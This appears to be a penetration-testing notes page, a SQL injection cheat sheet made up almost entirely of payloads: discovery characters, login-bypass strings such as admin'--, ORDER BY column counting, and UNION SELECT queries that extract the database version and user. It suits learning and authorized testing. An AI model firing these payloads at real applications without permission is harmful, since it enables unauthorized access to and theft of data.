# SQL Injections

<figure><img src="../../.gitbook/assets/types_of_sqli.jpg" alt=""><figcaption></figcaption></figure>

## Basic SQLi Discovery

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

### Basic Injection

<pre><code><strong>tom' or '1'='1
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Comments

```
admin'--
```

<figure><img src="../../.gitbook/assets/admin_dash.png" alt=""><figcaption></figcaption></figure>

#### Another Example

```
admin')--
admin') -- -
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
') or id = 5 -- -
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### UNION Injection

#### Using ORDER BY

```
' order by 1-- -
# We do the same for column 3 and 4 and get the results back. However, when we try to ORDER BY column 5, we get the following error:
```

<figure><img src="../../.gitbook/assets/order_by_5.jpg" alt=""><figcaption></figcaption></figure>

Using UNION

```
cn' UNION select 1,2,3-- -
```

<figure><img src="../../.gitbook/assets/ports_columns_correct.webp" alt=""><figcaption></figcaption></figure>

```
cn' UNION select 1,@@version,3,4-- -
```

<figure><img src="../../.gitbook/assets/db_version_1.jpg" alt=""><figcaption></figcaption></figure>

#### Other Example

```
cn' union select 1,user(),3,4-- -
```

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
